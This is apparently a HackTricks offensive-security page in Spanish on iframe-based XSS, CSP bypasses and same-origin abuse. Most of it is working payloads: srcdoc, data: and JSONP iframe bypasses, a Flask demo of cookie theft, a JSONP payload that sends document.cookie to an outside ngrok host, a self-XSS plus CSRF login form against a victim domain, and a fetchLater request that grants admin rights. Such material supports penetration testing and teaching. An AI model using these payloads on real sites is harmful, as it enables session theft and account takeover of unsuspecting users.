# Iframes en XSS, CSP y SOP

{{#include ../../banners/hacktricks-training.md}}

## Iframes en XSS

Hay 3 formas de indicar el contenido de una página en un iframe:

- A través de `src` indicando una URL (la URL puede ser de origen cruzado o del mismo origen)
- A través de `src` indicando el contenido usando el protocolo `data:`
- A través de `srcdoc` indicando el contenido

**Accediendo a variables de Padre e Hijo**
```html
<html>
<script>
var secret = "31337s3cr37t"
</script>

<iframe id="if1" src="http://127.0.1.1:8000/child.html"></iframe>
<iframe id="if2" src="child.html"></iframe>
<iframe
id="if3"
srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
<iframe
id="if4"
src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>

<script>
function access_children_vars() {
alert(if1.secret)
alert(if2.secret)
alert(if3.secret)
alert(if4.secret)
}
setTimeout(access_children_vars, 3000)
</script>
</html>
```

```html
<!-- content of child.html -->
<script>
var secret = "child secret"
alert(parent.secret)
</script>
```
Si accedes al html anterior a través de un servidor http (como `python3 -m http.server`), notarás que todos los scripts se ejecutarán (ya que no hay CSP que lo impida). **el padre no podrá acceder a la variable `secret` dentro de ningún iframe** y **solo los iframes if2 e if3 (que se consideran del mismo sitio) pueden acceder al secreto** en la ventana original.\
Nota cómo if4 se considera que tiene origen `null`.

### Iframes con CSP <a href="#iframes_with_csp_40" id="iframes_with_csp_40"></a>

> [!TIP]
> Por favor, nota cómo en los siguientes bypasses la respuesta a la página enmarcada no contiene ningún encabezado CSP que impida la ejecución de JS.

El valor `self` de `script-src` no permitirá la ejecución del código JS utilizando el protocolo `data:` o el atributo `srcdoc`.\
Sin embargo, incluso el valor `none` del CSP permitirá la ejecución de los iframes que pongan una URL (completa o solo la ruta) en el atributo `src`.\
Por lo tanto, es posible eludir el CSP de una página con:
```html
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src 'sha256-iF/bMbiFXal+AAl9tF8N6+KagNWdMlnhLqWkjAocLsk='" />
</head>
<script>
var secret = "31337s3cr37t"
</script>
<iframe id="if1" src="child.html"></iframe>
<iframe id="if2" src="http://127.0.1.1:8000/child.html"></iframe>
<iframe
id="if3"
srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
<iframe
id="if4"
src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>
</html>
```
Nota cómo el **CSP anterior solo permite la ejecución del script en línea**.\
Sin embargo, **solo se van a ejecutar los scripts `if1` y `if2`, pero solo `if1` podrá acceder al secreto del padre**.

![](<../../images/image (372).png>)

Por lo tanto, es posible **eludir un CSP si puedes subir un archivo JS al servidor y cargarlo a través de un iframe incluso con `script-src 'none'`**. Esto **potencialmente también se puede hacer abusando de un endpoint JSONP de mismo sitio**.

Puedes probar esto con el siguiente escenario donde se roba una cookie incluso con `script-src 'none'`. Simplemente ejecuta la aplicación y accede a ella con tu navegador:
```python
import flask
from flask import Flask
app = Flask(__name__)

@app.route("/")
def index():
resp = flask.Response('<html><iframe id="if1" src="cookie_s.html"></iframe></html>')
resp.headers['Content-Security-Policy'] = "script-src 'self'"
resp.headers['Set-Cookie'] = 'secret=THISISMYSECRET'
return resp

@app.route("/cookie_s.html")
def cookie_s():
return "<script>alert(document.cookie)</script>"

if __name__ == "__main__":
app.run()
```
### Otros Payloads encontrados en la naturaleza <a href="#other_payloads_found_on_the_wild_64" id="other_payloads_found_on_the_wild_64"></a>
```html
<!-- This one requires the data: scheme to be allowed -->
<iframe
srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
<!-- This one injects JS in a jsonp endppoint -->
<iframe srcdoc='
<script src="/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
<!-- sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)-->
<iframe
src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
```
### Iframe sandbox

El contenido dentro de un iframe puede estar sujeto a restricciones adicionales mediante el uso del atributo `sandbox`. Por defecto, este atributo no se aplica, lo que significa que no hay restricciones en su lugar.

Cuando se utiliza, el atributo `sandbox` impone varias limitaciones:

- El contenido se trata como si proviniera de una fuente única.
- Cualquier intento de enviar formularios es bloqueado.
- La ejecución de scripts está prohibida.
- El acceso a ciertas APIs está deshabilitado.
- Evita que los enlaces interactúen con otros contextos de navegación.
- El uso de plugins a través de `<embed>`, `<object>`, `<applet>` o etiquetas similares está prohibido.
- Se impide que el contenido navegue por el contexto de navegación de nivel superior por sí mismo.
- Las características que se activan automáticamente, como la reproducción de video o el enfoque automático de los controles de formulario, están bloqueadas.

El valor del atributo puede dejarse vacío (`sandbox=""`) para aplicar todas las restricciones mencionadas anteriormente. Alternativamente, puede establecerse en una lista de valores específicos separados por espacios que eximan al iframe de ciertas restricciones.
```html
<iframe src="demo_iframe_sandbox.htm" sandbox></iframe>
```
### Iframes sin credenciales

Como se explica en [este artículo](https://blog.slonser.info/posts/make-self-xss-great-again/), la bandera `credentialless` en un iframe se utiliza para cargar una página dentro de un iframe sin enviar credenciales en la solicitud, manteniendo la misma política de origen (SOP) de la página cargada en el iframe.

Esto permite que el iframe acceda a información sensible de otro iframe en la misma SOP cargada en la página principal:
```javascript
window.top[1].document.body.innerHTML = 'Hi from credentialless';
alert(window.top[1].document.cookie);
```
- Ejemplo de explotación: Self-XSS + CSRF

En este ataque, el atacante prepara una página web maliciosa con 2 iframes:

- Un iframe que carga la página de la víctima con la bandera `credentialless` con un CSRF que activa un XSS (Imagina un Self-XSS en el nombre de usuario del usuario):
```html
<html>
<body>
<form action="http://victim.domain/login" method="POST">
<input type="hidden" name="username" value="attacker_username<img src=x onerror=eval(window.name)>" />
<input type="hidden" name="password" value="Super_s@fe_password" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

- Otro iframe que en realidad tiene al usuario conectado (sin la bandera `credentialless`).

Luego, desde el XSS es posible acceder al otro iframe ya que tienen el mismo SOP y robar la cookie, por ejemplo ejecutando:
```javascript
alert(window.top[1].document.cookie);
```
### fetchLater Attack

Como se indica en [este artículo](https://blog.slonser.info/posts/make-self-xss-great-again/), la API `fetchLater` permite configurar una solicitud para que se ejecute más tarde (después de un cierto tiempo). Por lo tanto, esto puede ser abusado para, por ejemplo, iniciar sesión a una víctima dentro de la sesión de un atacante (con Self-XSS), establecer una solicitud `fetchLater` (para cambiar la contraseña del usuario actual, por ejemplo) y cerrar sesión de la sesión del atacante. Luego, la víctima inicia sesión en su propia sesión y la solicitud `fetchLater` se ejecutará, cambiando la contraseña de la víctima a la que estableció el atacante.

De esta manera, incluso si la URL de la víctima no se puede cargar en un iframe (debido a CSP u otras restricciones), el atacante aún puede ejecutar una solicitud en la sesión de la víctima.
```javascript
var req = new Request("/change_rights",{method:"POST",body:JSON.stringify({username:"victim", rights: "admin"}),credentials:"include"})
const minute = 60000
let arr = [minute, minute * 60, minute * 60 * 24, ...]
for (let timeout of arr)
fetchLater(req,{activateAfter: timeout})
```
## Iframes en SOP

Consulta las siguientes páginas:

{{#ref}}
../postmessage-vulnerabilities/bypassing-sop-with-iframes-1.md
{{#endref}}

{{#ref}}
../postmessage-vulnerabilities/bypassing-sop-with-iframes-2.md
{{#endref}}

{{#ref}}
../postmessage-vulnerabilities/blocking-main-page-to-steal-postmessage.md
{{#endref}}

{{#ref}}
../postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
